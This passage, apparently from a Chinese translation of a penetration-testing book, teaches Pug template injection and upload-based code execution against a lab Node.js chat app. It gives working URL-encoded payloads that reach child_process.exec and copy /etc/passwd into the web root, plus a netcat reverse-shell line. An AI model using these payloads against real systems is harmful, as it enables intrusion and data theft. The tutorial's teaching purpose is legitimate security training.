修改Cookie添加新创建的Base64静荷
转发流量，因为/是公开文件夹，您可以打开浏览器访问 http://chat: 3000/hacked.txt。
您现在实现了远程执行代码，可以随意对此系统进行后期利用。首先尝试访问/etc/passwd。
图3.21
如图3.22所示，在node-serialize模块的源代码中，我们看到这个函数表达式正在被计算，用户输入可能被执行，对于任何JavaScript/Node.js应用程序来说，这都是一个严重的问题。这种糟糕的实现方式导致我们可以突破这个应用程序。
图3.22
3.3.12 模板引擎攻击——模板注入
与标准HTML相比，模板引擎由于其模块化和简洁的代码，被广泛使用。模板注入是指用户输入直接传递到渲染模板，导致底层模板的修改。模板注入攻击已经出现在wikis、WSYWIG或电子邮件领域。因为这种情况很少是意外发生的，所以经常被误解为XSS。模板注入攻击使得攻击者可以访问底层操作系统，从而远程执行代码。
在下一个示例中，您将通过Pug对Node.js应用程序执行模板注入攻击。我们无意中将自己暴露在带有用户输入的元重定向的模板注入中，这是使用模板文本‘$｛｝’呈现的。值得注意的是，模板文字允许使用换行符，这要求我们不要跳出段落标记，因为Pug对空格和换行符很敏感，类似于Python。
在Pug中，第一个字符或单词代表关键字，用于指明标签或者函数。您也可以使用缩进指定多行字符串，如下所示。
p。 
这是一个段落缩进
这仍然是段落标记的一部分
以下是 HTML 和Pug模板的示例，如图 3.23所示。
图3.23
上面的示例文本显示了模版在HTML中的排版以及模版在Pug Markup语言中的排版。通过模板和字符串插值，我们可以创建快速、可重用且高效的模板。
1．模板注入示例
聊天应用程序容易受到模板注入攻击。在下面的应用程序中，我们将观察到是否可以与Pug模板系统进行交互。这可以通过检查输入参数是否可以处理基本操作进行判断。James Kettle写过一篇论文介绍攻击模板以及与底层模板系统的交互方式。
与Pug交互的步骤如下。
访问http://chat:3000，使用任何有效账户登录。
访问http://chat:3000/directmessage并输入用户和评论，单击“发送”。
接下来，回到directmessage，尝试在用户参数处添加XSS静荷。 
http://chat:3000/ti?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&co mment=&link=
图 3.24 所示表明应用程序存在XSS漏洞，但是可以与模板系统进行交互吗？
图3.24
在Burp历史记录中，查看服务器请求/响应，指向端点数据包/ti?user=，并将请求发送到Burp Repeater（组合键），如图3.25所示。
图3.25
2．测试基本操作
我们可以通过传递一个算术字符串来测试XSS易受攻击的参数是否用于模板注入。如果输入被评估，那么表明参数存在模板注入攻击的风险，这是因为模板（如编码语言）可以轻松支持算术运算。
基本操作测试如下。
使用Burp Repeater工具，对/ti测试各种模板注入参数。我们可以通过诸如9 × 9的数学运算完成相应测试。
我们可以看到计算并不正确，得到的运算结果不是81，如图3.26所示。请记住，用户输入包含在段落标记中，因此可以假设我们的Pug模板代码如下所示。 
p Message has been sent to !{user}
图3.26
利用Pug的特点。
（1）正如前文所述，Pug是用空格分隔的（类似于Python），换行符用于输入一个新的模板，这意味着如果跳出Pug中的当前行，就可以执行新的模板代码。在这种情况下，我们将跳出段落标记（），如上所示，执行新的恶意模板代码。为此，我们必须使用一些URL编码来利用此漏洞。
（2）逐步完成每个要求实现模板注入。
首先，我们需要另起一行，跳出当前模板。这可以使用以下字符来完成。 
%0a new line
其次，我们可以在Pug中使用“=”符号进行数学计算。 
%3d 是“=” 的编码
最后，我们可以输入数学方程式。 
9 × 9数学方程式
（3）因此，最终的静荷将如下所示。
[newline]=9\*9
URL编码： GET/ti?user=%0a%3d9*9&comment=&link=
（4）/ti?user =%0a%3d9 * 9在响应正文中输出了81，如图3.27所示。您在用户参数中实现了模板注入！我们利用JavaScript远程执行代码。
图3.27
正如您在响应中所看到的，我们在段落标记之外看到“81”的输出结果，而不是用户名！这意味着我们能够注入模板。
我们现在知道程序存在一些模板注入漏洞，可以进行简单的计算，但我们需要了解是否可以执行Shell。我们必须在Node/JavaScript中通过正确的函数来执行Shell。
首先，识别全局根对象，然后继续确定可以访问哪些模块和功能。最终使用Require函数导入child_process .exec，运行操作系统命令。在Pug中，“=”字符允许输出JavaScript结果。我们将从访问全局根对象开始。 
[new line]=globa
使用Burp的解码器工具将上述表达式进行URL编码，可以得到：%0a%3d %20%67%6c%6f%62%61%6c
使用上面的URL编码字符串作为用户值并重新发送。
在提交之前的请求后，如果一切顺利，我们将看到[object global]，如图3.28所示，这意味着我们可以访问全局对象。
图3.28
解析全局对象。
 通过在全局范围内使用Pug迭代器“each”，查看可以访问的对象和属性。注意换行符（%0a）和空格（%20）。
全局中的每个变量和索引 p = index
URL编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e% 20%67%6c%6f%62%61%6c%0a%20%20%70%3d%20%69%6e%64%65%78
 在上面的示例中，我们使用‘each’迭代器，它可以访问值，并且如果指定数组或对象，也可以访问索引。我们试图找到全局对象中可以访问的对象、方法或模块。最终目标是找到类似“require”的方法执行子进程.exec。从现在开始，我们反复对方法和对象进行试验和试错，最终找到require方法，如图3.29所示。 
图3.29
搜索代码执行函数。
 从上一个请求中，我们看到了全局中的所有对象以及一个名为“process”的对象。接下来，我们需要识别有趣的对象，这些对象可以在global.process中访问到。
- var x = global.process.mainModule.require p= index
URL编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e %20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%0a%20%20 %70%3d%20%69%6e%64%65%78
 我们尝试在所有可用的方法中选择“process”，因为它最终会执行 require，如图3.30所示。您可以选择不同的迭代方法，来对过程进行试验和试错。 
图3.30
global.process.mainModule的每个变量和索引 p= index
URL编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69 %6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d %61%69%6e%4d%6f%64%75%6c%65%0a%20%20%70%3d%20%69%6e%64 %65%78
远程执行代码。
发送最终的静荷，我们应该在global.process.mainModule中看到“require”函数。现在可以设置导入‘child_process’和.exec实现远程代码执行。 
- var x = global.process.mainModule.require
- x('child_process').exec('cat/etc/passwd >>/opt/web/chatSupportSystems/ public/accounts.txt')
URL编码： %0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%62%61%6c%2e %70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65 %2e%72%65%71%75%69%72%65%20%0a%2d%20%78%28%27%63%68%69 %6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28 %27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%3e %3e%20%2f%6f%70%74%2f%77%65%62%2f%63%68%61%74%53%75%70 %70%6f%72%74%53%79%73%74%65%6d%73%2f%70%75%62%6c%69%63 %2f%61%63%63%6f%75%6e%74%73%2e%74%78%74%27%29
在上面的示例中，我们像在JavaScript中一样定义变量“x”，但行首的破折号表示无缓冲输出（隐藏）。我们将全局对象和最终获得require所需的模块一起使用，从而可以使用child_process.exec来运行系统命令。
将/etc/passwd的内容输出到Web公共根目录，这是唯一具有写入权限的目录（由应用程序创建者设计），并且允许用户查看内容。我们也可以执行反向Shell或系统命令允许的任何其他内容。
我们可以访问http://chat:3000/accounts.txt，包含网站服务器/etc/passwd的内容，如图3.31所示。
图3.31
在系统上实现远程执行代码并返回Shell。
现在，我们可以自动化这个过程吗？当然可以。一个名为Tplmap的工具（可在GitHub网站中搜索）与SQLmap类似，它尝试将所有不同的模板注入组合，如图3.32所示。
cd /opt/tplmap
./tplmap.py -u "http://chat:3000/ti?user=*&comment=asdfasdf&link="
图3.32
3.3.13 JavaScript和远程代码执行
在每次安全评估和Web应用程序渗透测试中，我们尽可能实现远程执行代码。虽然远程执行代码几乎会出现在任何地方，但是常见于上传WebShell、Imagetragick漏洞利用、使用Office文件开展XXE攻击、目录遍历结合上传功能实现关键文件替换等过程。
通常，我们可能会尝试找到上传区域，并使用Shell。下面的网址包含各种不同类型的webshell静荷（可以GitHub网站中搜索）。注意，这些Shell没有经过任何审查，使用它们您需要自担风险。我在互联网上见到很多网站Shell中包含恶意软件。
利用上传缺陷攻击存在漏洞的聊天应用程序
在实验中，我们将在Node应用程序上实现代码上传和远程执行。在示例中，文件上传功能允许上传任何文件。不幸的是，对于Node应用，我们不能像PHP语言那样，通过Web浏览器调用文件，实现文件的执行。因此，在这种情况下，我们将使用动态路由端点，尝试呈现Pug文件的内容。如图3.33所示，端点读取文件的内容，并且认为是Pug文件，因为默认目录存在于Views目录中，这就是漏洞所在。此端点还存在路径遍历和本地文件读取漏洞。
图3.33
在上传过程中，文件处理程序模块将该文件重新命名为随机字符串，并且不带扩展名。在页面的上传响应内容中，存在上传文件的服务器路径位置。利用此路径信息，我们可以使用/drouting执行模板注入攻击，实现远程代码执行。
既然我们知道底层应用程序是Node（JavaScript），那么我们可以通过Pug上传什么样的静荷并用于执行？回到之前使用的简单示例。
首先，将变量分配给require模块。 
-var x = global.process.mainModule.require
使用子进程模块访问操作系统功能函数，运行任何系统命令。 
-x('child_process').exec('nc [Your_IP] 8888 -e/bin/bash')
执行远程代码上传攻击。
访问http://chat:3000并使用任何有效账户登录，如图3.34所示。
图3.34